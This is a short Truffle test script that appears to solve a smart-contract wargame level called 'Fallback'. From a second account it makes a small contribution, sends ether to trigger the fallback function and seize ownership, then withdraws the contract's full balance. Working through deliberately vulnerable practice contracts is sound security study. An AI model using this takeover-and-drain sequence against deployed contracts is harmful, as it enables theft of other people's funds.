const Fallback = artifacts.require("Fallback");
  
contract('Fallback', (accounts) => {
  it('Claim ownership', async () => {
    const accountOne = accounts[0];
    const accountTwo = accounts[1];

    const instance = await Fallback.deployed();

    let owner = await instance.owner();

    assert.equal(owner, accountOne, "Owner account correct!");

    await instance.contribute({value: 1, from: accountTwo});
    await instance.sendTransaction({value: 1, from: accountTwo});

    owner = await instance.owner();
    assert.equal(owner, accountTwo, "Owner account was changed!");

    await instance.withdraw({from: accountTwo});
    balance = await web3.eth.getBalance(instance.address);

    assert(balance.toString() == "0", "Empty balance");
  });
});

